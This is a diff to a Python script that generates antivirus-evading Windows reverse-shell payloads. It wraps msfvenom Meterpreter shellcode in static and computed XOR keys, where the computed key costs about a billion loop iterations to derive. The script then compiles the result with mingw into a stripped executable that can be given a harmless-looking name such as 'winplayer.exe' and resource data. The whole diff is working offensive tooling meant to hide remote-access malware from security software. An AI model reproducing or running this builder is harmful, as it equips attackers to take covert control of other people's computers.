@@ -1,7 +1,12 @@
+#!/usr/bin/env python
+
 import os
 import random
+import subprocess
+import argparse
 
-def generate_shellcode(lhost, lport, payload):
+
+def generate_payload_shellcode(lhost, lport, payload):
     res = os.system('msfvenom -f py -p ' + payload + ' LHOST=' + lhost + ' LPORT=' + str(lport) + ' -o shellcode.py')
     
     if res != 0:
@@ -12,6 +17,8 @@ def generate_shellcode(lhost, lport, payload):
     fd.close()
     buf = ""
 
+    os.remove('shellcode.py')
+
     exec(code)
 
     shellcode = [x for x in buf]
@@ -21,66 +28,174 @@ def generate_shellcode(lhost, lport, payload):
 
 def xor_shellcode(buf, xorkey): 
     keylen = len(xorkey)
-    return [chr(ord(x) ^ ord(xorkey[i % keylen])) for i,x in enumerate(buf)]
+    return [chr(ord(x) ^ xorkey[i % keylen]) for i,x in enumerate(buf)]
     
-def generate_xor_key(size = 200):
-    xorkey = [os.urandom(1) for _ in xrange(size)]
+def generate_random_key(size = 200):
+    xorkey = [ord(os.urandom(1)) for _ in xrange(size)]
     return xorkey
+
+
+def compute_payload_key(nbr_iter = 1000000000, key_size = 100):
+
+    compute_key_program = """ 
+#include <stdio.h>
+#include <stdlib.h>
+
+void compute(int iterations, unsigned char* u, int size) {
+    for(int i = 0; i < iterations; i++) {
+        int a = (i+2) % size;
+        int b = (i+1) % size;
+        int c = i % size;
+        u[a] = (u[b] + u[c] + i) % 255; 
+    } 
+}
+
+int main(int argc, char* argv[]) {
+
+    if (argc < 3) {
+        printf("usage: %s <iterations_number> <key_size>\\n", argv[0]);
+        exit(1);
+    }
+
+    int key_size = atoi(argv[2]);
+    int iterations_number = atoi(argv[1]);
+
+    unsigned char *u = malloc(key_size);
+    for (int i = 0; i < key_size; i++) {
+        u[i] = i;
+    }
+
+    compute(iterations_number, u, key_size);
+    
+    for (int i = 0; i < key_size; i++) {
+        printf("%d ", u[i]);
+    }
+    return 0;
+}
+"""
+    fd = open('compute_key.c', 'w')
+    fd.write(compute_key_program)
+    fd.close()
+
+    ret = os.system('gcc compute_key.c -o compute_key')
+    
+    if ret != 0:
+        raise Exception('build failed with error: ' + str(ret))
+
+    os.remove('compute_key.c')
+    result = subprocess.check_output('./compute_key ' + str(nbr_iter) + ' ' + str(key_size), shell=True)
+    key = [int(x) for x in result.split(' ')[:-1]]
+    os.remove('compute_key')
+    return key
+
 
 def generate_xor_key_size():
     return random.randint(100,200)
 
-def c_xor_buffer(buffer_name, key_name, key_size_name):
-    c = ""
-    c += "for(int i = 0; i < buflen; i++) {\n"
-    c += "\t\t" + buffer_name + "[i] = " + buffer_name + "[i] ^ " + key_name + "[i % " + key_size_name + "];\n"
-    c += "\t}"
-    return c
+def generate_number_of_iterations():
+    return random.randint(1000000000, 2000000000)
 
-def generate_payload(lhost, lport = 4444, payload = 'windows/meterpreter/reverse_tcp'):
-    print "Generating Payload"
-    
-    buf, buflen = generate_shellcode(lhost, lport, payload)
+def hex_to_string(key):
+    return "".join(["\\x%02x"%ord(x) for x in key])
 
-    xorkey_size = generate_xor_key_size()
-    xorkey = generate_xor_key(xorkey_size)
-
-    buf = xor_shellcode(buf, xorkey)
+def byte_to_string(key):
+    return "".join(["\\x%02x"%x for x in key])
 
 
-    payload = 'int buflen = ' + str(buflen) + ';\n'
-    payload += 'char buf[] = "' + "".join(["\\x%02x"%ord(x) for x in buf]) + '";\n'
+def generate_payload(lhost, lport = 4444, payload = 'windows/x64/meterpreter/reverse_tcp'):
+    print "[+] Loading template"
 
     tpl_file = open('template.c', 'r')
     tpl = tpl_file.read()
     tpl_file.close()
-    
-    # Add payload
-    tpl = tpl.replace('[[PAYLOAD]]', payload)
 
-    # Add AV evasion work
-    work = ""
-    work += 'char xorkey[] = "' + "".join(["\\x%02x"%ord(x) for x in xorkey]) + '";\n\t'
-    work += "int xorkey_size = " + str(xorkey_size) + ";\n\t"
-    work += c_xor_buffer("buf", "xorkey", "xorkey_size")
-    tpl = tpl.replace('[[WORK]]', work)
+
+    print "[+] Generating payload key"
+
+    iterations_number = generate_number_of_iterations()
+    tpl = tpl.replace('[[PAYLOAD_ITER_NUMBER]]', str(iterations_number))
+ 
+    payload_key_size = generate_xor_key_size()
+    payload_key = compute_payload_key(iterations_number, payload_key_size)
+
+    tpl = tpl.replace('[[PAYLOAD_KEY_LENGTH]]', str(payload_key_size))
+
+    print "[+] Generating payload shellcode"
+    
+    payload_shellcode, payload_shellcode_length = generate_payload_shellcode(lhost, lport, payload)
+
+    payload_static_key_length = generate_xor_key_size()
+    payload_static_key = generate_random_key(payload_static_key_length)
+
+    tpl = tpl.replace('[[PAYLOAD_STATIC_KEY]]', byte_to_string(payload_static_key))
+    tpl = tpl.replace('[[PAYLOAD_STATIC_KEY_LENGTH]]', str(payload_static_key_length))
+
+    print "[+] Obfuscating shellcode"
+
+    # static xor
+    shellcode = xor_shellcode(payload_shellcode, payload_static_key) 
+    
+    # dynamic xor
+    shellcode = xor_shellcode(shellcode, payload_key) 
+
+    
+    tpl = tpl.replace('[[SHELLCODE_PAYLOAD]]', hex_to_string(shellcode))
+    tpl = tpl.replace('[[SHELLCODE_PAYLOAD_LENGTH]]', str(payload_shellcode_length))
     
     fd = open('payload.c', 'w')
     fd.write(tpl)
     fd.close()
     
-def build_payload(output = 'payload.exe'):
-    ret = os.system('i686-w64-mingw32-gcc -mwindows payload.c -o ' + output)
+def build_payload(output = 'payload.exe', resource = None):
+    print "[+] Building binary"
+
+    ret = os.system('x86_64-w64-mingw32-gcc -c payload.c -o payload.o')
 
     if ret != 0:
         raise Exception('build failed with error: ' + str(ret))
 
+    if resource:
+        ret = os.system('x86_64-w64-mingw32-windres -F pe-x86-64 ' + resource + ' resources.o')
+
+        if ret != 0:
+            raise Exception('build failed with error: ' + str(ret))
+
+        ret = os.system('x86_64-w64-mingw32-gcc -mwindows resources.o payload.o -o ' + output)
+
+        os.remove('resources.o')
+    else:
+        ret = os.system('x86_64-w64-mingw32-gcc -mwindows payload.o -o ' + output)
+
+        if ret != 0:
+            raise Exception('build failed with error: ' + str(ret))
+            
+    os.remove('payload.o')
+
+
 def strip_payload(output = 'payload.exe'):
+    print "[+] Stripping binary"
     ret = os.system('strip --strip-unneeded -X ' + output)
 
     if ret != 0:
         raise Exception('strip failed with error: ' + str(ret))
 
-generate_payload('172.21.35.1')
-build_payload()
-strip_payload()
+def generate(lhost, lport, payload = 'windows/x64/meterpreter/reverse_tcp', resource = None, output = 'winplayer.exe'):
+    generate_payload(lhost, lport,payload)
+    build_payload(output, resource)
+    strip_payload(output)
+
+def main():
+    parser = argparse.ArgumentParser(description='Generate an objuscated payload in 64 bit using msfvenom and mingw32.')
+    parser.add_argument('-p', '--payload', default='windows/x64/meterpreter/reverse_tcp', type=str, help='metasploit payload')
+    parser.add_argument('lhost', type=str, help='Host IP Address')
+    parser.add_argument('lport', type=int, help="Listenning port")
+    parser.add_argument('-o', '--output', default='payload.exe', help='Output PE name')
+    parser.add_argument('-r', '--resource', help='Resource file')
+
+    args = parser.parse_args()
+
+    generate(args.lhost, args.lport, args.payload, args.resource, args.output)
+
+    
+
+main()
